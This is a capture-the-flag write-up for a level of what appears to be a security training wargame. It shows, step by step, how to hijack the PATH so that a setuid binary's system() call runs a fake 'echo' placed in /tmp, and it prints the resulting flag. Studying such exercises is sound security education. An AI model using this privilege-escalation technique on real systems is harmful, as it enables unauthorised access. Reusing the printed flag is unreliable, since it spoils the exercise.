# Level02

### Tools
strings command : https://ioflood.com/blog/strings-linux-command/


### How to solve it

1. After loging in using ssh in level03@(vmIP): 
```
ssh level02@000.000.000.000 -p 4242
```
2. We use the ls command and it shows level03 file
```
level03
```
3. Then we have to try to execute it and we get a message
```
Exploit me
```
4. In order to check whats inside we use strings function to get printable information inside it
```
strings level03 and if you want to find it faster using Exploit string just add a pipe with Exploit strings level03 | grep Explot
```
5. The we have a path along with Exploit me string
```
/usr/bin/env echo Exploit me
```
6. So now we know the path that echo is called with system() like system("/usr/bin/env echo Exploit me.") and then we have to use it to run getflag inside the program.
6. The problem is we have to run it inside their system and we have to use flag03 user to execute it, one way is exchanging the echo command for the getflag command.
7. First we create a file in /tmp with a echo that will get the flag and then we give permisson for it.
```
echo -e '#!/bin/bash\ngetflag' > /tmp/echo 
chmod +x /tmp/echo
```
8. The we have export the PATH of this echo to env
```
export PATH=/tmp:$PATH

```
8. Now we run the program and our fake echo will run getflag inside it and we now have the flag:
```
qi0maab88jeaj46qoumi7maus
```
### How to protect
 - This only works because the program sets the current user to flag03, if it was not implemented it wouldnt work

